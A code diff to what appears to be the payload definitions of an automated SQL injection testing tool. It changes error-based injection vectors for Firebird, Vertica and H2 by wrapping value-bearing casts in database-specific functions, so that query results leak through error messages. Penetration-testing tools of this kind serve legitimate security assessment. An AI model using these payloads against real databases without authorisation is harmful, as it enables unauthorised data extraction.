@@ -770,9 +770,10 @@
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <!-- BIN_SHL (Firebird-exclusive) encloses the value-bearing BIGINT cast: reflects on Firebird, fails to bind elsewhere -->
+        <vector>AND [RANDNUM]=BIN_SHL(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS BIGINT),1)</vector>
         <request>
-            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=BIN_SHL(CAST('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]' AS BIGINT),1)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -789,9 +790,9 @@
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=BIN_SHL(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS BIGINT),1)</vector>
         <request>
-            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=BIN_SHL(CAST('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]' AS BIGINT),1)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -847,9 +848,10 @@
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <!-- ZEROIFNULL (Vertica-exclusive) encloses the value-bearing NUMERIC cast: reflects on Vertica, fails to bind elsewhere -->
+        <vector>AND [RANDNUM]=ZEROIFNULL(CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+            <payload>AND [RANDNUM]=ZEROIFNULL(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -866,9 +868,9 @@
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <vector>OR [RANDNUM]=ZEROIFNULL(CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+            <payload>OR [RANDNUM]=ZEROIFNULL(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -981,9 +983,10 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INT)</vector>
+        <!-- ROTATELEFT (H2-exclusive) encloses the value-bearing INT cast: reflects on H2, fails to bind elsewhere -->
+        <vector>AND [RANDNUM]=ROTATELEFT(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INT),1)</vector>
         <request>
-            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]' AS INT)</payload>
+            <payload>AND [RANDNUM]=ROTATELEFT(CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]' AS INT),1)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1000,9 +1003,9 @@
         <risk>3</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INT)</vector>
+        <vector>OR [RANDNUM]=ROTATELEFT(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INT),1)</vector>
         <request>
-            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]' AS INT)</payload>
+            <payload>OR [RANDNUM]=ROTATELEFT(CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]' AS INT),1)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
